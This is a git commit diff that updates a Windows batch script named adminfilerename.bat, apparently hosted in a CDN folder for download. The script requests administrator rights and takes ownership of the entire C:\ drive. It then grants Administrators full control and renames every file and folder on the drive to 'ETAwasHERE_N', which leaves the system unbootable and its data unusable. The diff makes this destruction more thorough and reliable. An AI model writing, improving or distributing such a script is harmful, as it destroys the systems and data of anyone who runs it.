ed4927635c6900244fcaa4e36daa87d70bee4301
ETAModder <222704789+ETAModder@users.noreply.github.com>
2025-10-18 19:07:28 -0700

    git gub copilot i dont want your commit message vro

--- cdn/adminfilerename.bat
+++ cdn/adminfilerename.bat
@@ -1,39 +1,42 @@
 @echo off
 setlocal enabledelayedexpansion
 
+set "target=C:\"
+set "basename=ETAwasHERE"
+
+:: --- elevate if not admin ---
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo getting admin
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    echo getting ze adminz
+    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
     exit /b
 )
 
-set "target=C:\"
+echo takeowning lmao
+takeown /f "%target%" /r /d y >nul 2>&1
+icacls "%target%" /grant Administrators:F /t /c >nul 2>&1
 
-echo getting perms in "%target%"
-takeown /f "%target%" /r /d y >nul
-icacls "%target%" /grant administrators:F /t /c >nul
-
+set /a count=0
 echo.
-echo renaming ze files
-set count=0
+echo doing the funnies
 
 for /r "%target%" %%F in (*) do (
     set /a count+=1
-    set "name=ETAwasHERE(!count!)"
     set "ext=%%~xF"
-    ren "%%F" "!name!!ext!" 2>nul
+    set "newname=%basename%_!count!!ext!"
+    ren "%%F" "!newname!" 2>nul
 )
 
 echo.
-echo Renaming folders...
-for /r "%target%" %%D in (.) do (
-    if not "%%~nxD"=="." (
-        set /a count+=1
-        ren "%%D" "ETAwasHERE(!count!)" 2>nul
-    )
+echo doing the funnies again
+
+for /f "delims=" %%D in ('dir "%target%" /ad /b /s ^| sort /R') do (
+    set /a count+=1
+    set "parent=%%~dpD"
+    set "newname=%basename%_!count!"
+    ren "%%D" "!newname!" 2>nul
 )
 
 echo.
-echo renamed !count! files & folders
+echo finished files effected: !count!
 pause
